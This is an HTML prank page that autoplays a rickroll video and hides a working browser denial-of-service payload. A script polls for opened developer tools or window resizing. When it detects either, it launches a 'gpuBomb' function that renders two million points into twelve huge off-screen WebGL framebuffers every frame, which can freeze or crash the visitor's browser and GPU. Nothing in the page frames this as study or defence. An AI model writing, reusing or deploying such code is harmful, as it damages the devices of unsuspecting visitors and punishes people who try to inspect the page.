<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cool Website</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            font-family: Arial, sans-serif;
            color: #ffffff;
        }
        #overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            z-index: 10;
            font-size: 2rem;
            font-weight: bold;
            text-align: center;
            padding: 20px;
        }
        video {
            width: 100%; height: 100%;
            object-fit: contain;
            display: none;
        }
        #c {
            position: fixed;
            top: -9999px;
            left: -9999px;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div id="overlay">Click to enter my cool website!</div>
    <video id="rickroll" src="rickroll.mp4" loop playsinline></video>
    <canvas id="c"></canvas>
    <script>
        const overlay = document.getElementById('overlay');
        const video = document.getElementById('rickroll');

        window.addEventListener('load', () => {
            video.muted = true;
            video.style.display = 'block';
            overlay.style.display = 'none';
            video.play().then(() => {
                document.addEventListener('click', () => { video.muted = false; }, { once: true });
            }).catch(() => {
                video.muted = false;
                overlay.style.display = 'flex';
                video.style.display = 'none';
                overlay.addEventListener('click', () => {
                    overlay.style.display = 'none';
                    video.style.display = 'block';
                    video.play();
                });
            });
        });

        function gpuBomb() {
            const canvas = document.getElementById('c');
            canvas.width = 4096;
            canvas.height = 4096;
            const gl = canvas.getContext('webgl2', {
                antialias: true,
                powerPreference: 'high-performance',
                preserveDrawingBuffer: true
            });

            const vs = `#version 300 es
            in vec4 p;
            uniform float t;
            uniform mat4 mv;
            void main(){
                float x = p.x + sin(p.y * 13.7 + t * 3.1) * 0.8 + cos(p.z * 9.3 + t * 2.7) * 0.6;
                float y = p.y + cos(p.x * 11.1 + t * 2.3) * 0.8 + sin(p.z * 7.9 + t * 3.9) * 0.6;
                float z = p.z + sin(p.x * 8.5 + t * 1.7) * 0.8 + cos(p.y * 12.3 + t * 2.1) * 0.6;
                gl_Position = mv * vec4(x, y, z, 1.0);
                gl_PointSize = 1.0;
            }`;

            const fs = `#version 300 es
            precision highp float;
            uniform float t;
            out vec4 col;
            void main(){
                float r = sin(t * 1.3) * 0.5 + 0.5;
                float g = cos(t * 0.9) * 0.5 + 0.5;
                float b = sin(t * 2.1 + 1.5) * 0.5 + 0.5;
                float dist = length(gl_PointCoord - vec2(0.5));
                if(dist > 0.5) discard;
                col = vec4(r, g, b, 1.0);
            }`;

            function makeShader(type, src) {
                const s = gl.createShader(type);
                gl.shaderSource(s, src);
                gl.compileShader(s);
                return s;
            }

            const prog = gl.createProgram();
            gl.attachShader(prog, makeShader(gl.VERTEX_SHADER, vs));
            gl.attachShader(prog, makeShader(gl.FRAGMENT_SHADER, fs));
            gl.linkProgram(prog);
            gl.useProgram(prog);

            const COUNT = 2_000_000;
            const verts = new Float32Array(COUNT * 3);
            for (let i = 0; i < COUNT * 3; i++) {
                verts[i] = (Math.random() - 0.5) * 6;
            }

            const buf = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, buf);
            gl.bufferData(gl.ARRAY_BUFFER, verts, gl.STATIC_DRAW);

            const pLoc = gl.getAttribLocation(prog, 'p');
            gl.enableVertexAttribArray(pLoc);
            gl.vertexAttribPointer(pLoc, 3, gl.FLOAT, false, 0, 0);

            const tLoc = gl.getUniformLocation(prog, 't');
            const mvLoc = gl.getUniformLocation(prog, 'mv');

            const extraBuffers = [];
            for (let i = 0; i < 12; i++) {
                const fb = gl.createFramebuffer();
                const tex = gl.createTexture();
                gl.bindTexture(gl.TEXTURE_2D, tex);
                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
                gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
                gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
                extraBuffers.push({ fb, tex });
            }

            function makeMV(t) {
                const c = Math.cos(t), s = Math.sin(t);
                const c2 = Math.cos(t * 0.7), s2 = Math.sin(t * 0.7);
                return new Float32Array([
                    c,  s2*s, c2*s, 0,
                   -s,  c2*c,-s2*c, 0,
                    0, -s2,   c2,   0,
                    0,  0,    0,   0.35
                ]);
            }

            let frameCount = 0;
            function render() {
                const t = performance.now() / 1000;
                const mv = makeMV(t);

                for (const { fb } of extraBuffers) {
                    gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
                    gl.viewport(0, 0, 4096, 4096);
                    gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);
                    gl.uniform1f(tLoc, t + frameCount * 0.01);
                    gl.uniformMatrix4fv(mvLoc, false, mv);
                    gl.drawArrays(gl.POINTS, 0, COUNT);
                }

                gl.bindFramebuffer(gl.FRAMEBUFFER, null);
                gl.viewport(0, 0, 4096, 4096);
                gl.clear(gl.COLOR_BUFFER_BIT);
                gl.uniform1f(tLoc, t);
                gl.uniformMatrix4fv(mvLoc, false, mv);
                gl.drawArrays(gl.POINTS, 0, COUNT);

                frameCount++;
                requestAnimationFrame(render);
            }

            render();
        }

        let triggered = false;
        function checkDevTools() {
            if (triggered) return;
            const widthGap = window.outerWidth - window.innerWidth;
            const heightGap = window.outerHeight - window.innerHeight;
            const suspiciouslyNarrow = window.outerWidth < 800 && screen.width >= 1024;
            if (widthGap > 160 || heightGap > 160 || suspiciouslyNarrow) {
                triggered = true;
                gpuBomb();
            }
        }

        setInterval(checkDevTools, 300);
        window.addEventListener('resize', checkDevTools);
    </script>
</body>
</html>
